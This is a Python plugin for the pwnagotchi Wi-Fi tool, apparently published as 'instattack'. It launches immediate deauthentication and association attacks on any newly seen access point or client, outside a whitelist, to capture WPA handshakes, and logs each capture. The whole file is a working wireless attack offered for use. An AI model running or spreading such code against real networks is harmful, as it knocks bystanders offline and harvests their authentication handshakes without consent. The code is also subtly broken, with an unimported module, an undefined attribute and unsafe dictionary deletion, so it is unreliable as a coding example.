import logging

import pwnagotchi.plugins as plugins

class instattack(plugins.Plugin):
    __author__ = '129890632+Sniffleupagus@users.noreply.github.com'
    __version__ = '1.0.0'
    __license__ = 'GPL3'
    __description__ = 'Pwn more aggressively. Launch immediate associate or deauth attack when bettercap spots a device.'

    def __init__(self):
        logging.debug("instattack plugin created")
        self._agent = None
        self.old_name = None
        self.recents = {}

    # called before the plugin is unloaded
    def on_unload(self, ui):
        if self.old_name:
            ui.set('name', "%s " % self.old_name)
        else:
            ui.set('name', "%s>  " % ui.get('name')[:-3])
        self.old_name = None
        logging.info("instattack out.")

    # called to setup the ui elements
    def on_ui_setup(self, ui):
        self._ui = ui

    def on_ui_update(self, ui):
        if self.old_name == None:
            self.old_name = ui.get('name')
            if self.old_name:
                i = self.old_name.find('>')
                if i:
                    ui.set('name', "%s%s" % (self.old_name[:i], "!!!"))

    # called when everything is ready and the main loop is about to start
    def on_ready(self, agent):
        self._agent = agent
        logging.info("instattack attack!")
        agent.run("wifi.clear")
        if self._ui:
            self._ui.set("status", "Be aggressive!\nBE BE AGGRESSIVE!")


    # REQUIRES: https://github.com/evilsocket/pwnagotchi/pull/1192
    #
    # PR to pass on all bettercap events to interested plugins. bettercap event
    # name is used to make an "on_" handler to plugins, like below.

    def track_recent(self, ap, cl=None):
        ap['_track_time'] = time.time()
        self.recents[ap['mac'].lower()] = ap
        if cl:
            cl['_track_time'] = ap['_track_time']
            self.recents[cl['mac'].lower()] = cl

    def ok_to_attack(self, ap):
        if not self._agent:
            return False

        whitelist = list(map(lambda x: x.lower(), self._agent._config['main']['whitelist']))
        return ap['hostname'].lower() not in whitelist \
            and ap['mac'].lower() not in whitelist \
            and ap['mac'][:8].lower() not in whitelist

    def on_bcap_wifi_ap_new(self, agent, event):
        try:
            ap = event['data']
            if agent._config['personality']['associate'] and self.ok_to_attack(ap):
                logging.info("insta-associate: %s (%s)" % (ap['hostname'], ap['mac']))
                agent.associate(ap, 0.3)
        except Exception as e:
            logging.error(repr(e))

    def on_bcap_wifi_client_new(self, agent, event):
        try:
            ap = event['data']['AP']
            cl = event['data']['Client']
            if agent._config['personality']['deauth'] and self.ok_to_attack(ap) and self.ok_to_attack(cl):
                logging.info("insta-deauth: %s (%s)->'%s'(%s)(%s)" % (ap['hostname'], ap['mac'],
                                                                      cl['hostname'], cl['mac'], cl['vendor']))
                agent.deauth(ap, cl, 0.75)
        except Exception as e:
            logging.error(repr(e))

    def on_handshake(self, agent, filename, ap, cl):
        logging.info("insta-shake? %s" % ap['mac'])
        if 'mac' in ap and 'mac' in cl:
            amac = ap['mac'].lower()
            cmac = cl['mac'].lower()
            if amac in self.recents:
                logging.info("insta-shake!!! %s (%s)->'%s'(%s)(%s)" % (ap['hostname'], ap['mac'],
                                                                       cl['hostname'], cl['mac'], cl['vendor']))
                del self.recents[amac]
                if cmac in self.recents:
                    del self.recents[cmac]

    def on_epoch(self, agent, epoch, epoch_data):
        for mac in self.recents:
            if self.recents[mac]['_track_time'] < (time.time() - (self.epoch_duration * 2)):
                del self.recents[mac]
